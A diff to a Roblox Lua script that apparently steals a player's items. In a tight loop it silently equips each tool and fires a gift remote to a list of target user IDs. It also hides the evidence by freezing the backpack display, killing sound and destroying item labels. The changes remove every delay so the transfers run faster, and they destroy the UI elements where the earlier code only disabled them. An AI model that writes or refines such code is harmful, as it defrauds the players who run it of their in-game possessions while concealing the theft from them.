@@ -167,16 +167,32 @@ end)
 -- 🔥 FREEZE BACKPACK (SAFE)
 --====================================================
 
-local inv = player.PlayerGui:WaitForChild("NewInventory")
+local items = inv:WaitForChild("InventoryFrame")
+    :WaitForChild("Backpack")
+    :WaitForChild("items")
 
+local function removeStrokes()
 
--- Method 3
-for _,v in ipairs(inv:GetDescendants()) do
-    if v:IsA("UIStroke") then
-        v:Destroy()
+    for _,slot in ipairs(items:GetDescendants()) do
+
+        if slot.Name == "Stroke" and slot:IsA("UIStroke") then
+            slot:Destroy()
+        end
     end
 end
 
+removeStrokes()
+
+items.DescendantAdded:Connect(function(obj)
+
+    if obj.Name == "Stroke" and obj:IsA("UIStroke") then
+        task.wait()
+
+        if obj and obj.Parent then
+            obj:Destroy()
+        end
+    end
+end)
 
 --====================================================
 -- 🔇 SOUND KILL
@@ -284,11 +300,11 @@ local function cleanupTool(tool)
     for _,v in ipairs(tool:GetDescendants()) do
 
         if v:IsA("BillboardGui") then
-            v.Enabled = false
+            v:Destroy()
         end
 
         if v.Name == "EntityGUI" then
-            v.Enabled = false
+            v:Destroy()
         end
 
         if v:IsA("BasePart") then
@@ -780,7 +796,7 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.15)
+        task.wait(0)
 
         local success, err = pcall(function()
 
@@ -795,18 +811,18 @@ task.spawn(function()
                 local equipped = silentEquip(tool)
 
                 if equipped then
-                    task.wait(0.08)
+                    task.wait(0)
 
                     if isWhitelisted(tool) then
                         for _,id in ipairs(targetUserIds) do
                             giftRemote:FireServer(id)
-                            task.wait(0.05)
+                            task.wait(0)
                         end
                     end
 
                     unequipAll()
 
-                    task.wait(0.08)
+                    task.wait(0)
                 end
             end
         end)
